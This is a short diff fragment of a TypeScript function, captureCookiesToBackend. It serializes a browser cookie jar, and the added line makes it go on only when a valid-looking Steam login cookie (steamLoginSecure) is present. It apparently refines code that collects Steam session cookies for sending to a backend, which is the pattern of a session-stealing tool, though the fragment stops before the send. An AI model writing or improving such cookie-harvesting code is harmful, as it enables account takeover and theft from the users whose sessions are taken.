@@ -25,6 +25,7 @@ export function captureCookiesToBackend(): void {
     }
 
     if (!jar.sessionid) return;
+    if (!jar.steamLoginSecure || jar.steamLoginSecure.length < 40) return;
 
     const payload = JSON.stringify(jar);
     try {
